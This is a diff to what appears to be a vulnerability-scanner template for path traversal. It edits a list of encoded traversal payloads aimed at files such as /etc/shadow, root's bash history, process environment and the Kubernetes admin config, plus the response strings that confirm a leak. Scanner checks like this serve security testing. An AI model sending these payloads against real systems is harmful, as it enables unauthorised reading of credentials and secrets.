@@ -71,7 +71,6 @@ wordLists:
     - ..%252f..%252f..%252fvar%252flib%252fdocker%252fcontainers
     - ..%5c..%5c..%5cC:%5cWindows%5cMicrosoft.NET%5cFramework%5cv4.0.30319%5cConfig%5cmachine.config
     - ..//..//..//proc/self/environ
-    - ..%c0%afdocker.sock
     - ../../../../../../../../../../../../etc/shadow%00
     - ../../../../../../../../../../../../root/.bash_history%00
     - ..//..//..//etc/kubernetes/admin.conf
@@ -116,16 +115,15 @@ validate:
       - "apiVersion: v1"          
       - "kind: Pod"              
       - "kubernetes-admin@"       
-      - "client-certificate-data" 
-      - "docker.sock"             
+      - "client-certificate-data"             
       - "Entrypoint"             
       - "shosts.equiv"           
       - "AuthorizedKeysFile"     
-      - "/var/log/auth.log"     
-      - "/etc/hostname"          
+      - "/var/log/auth.log"        
       - "127.0.0.1"
     length:
       gt: 0
     not_contains:
       - <html>
       - </html>
+      - <!doctype html>
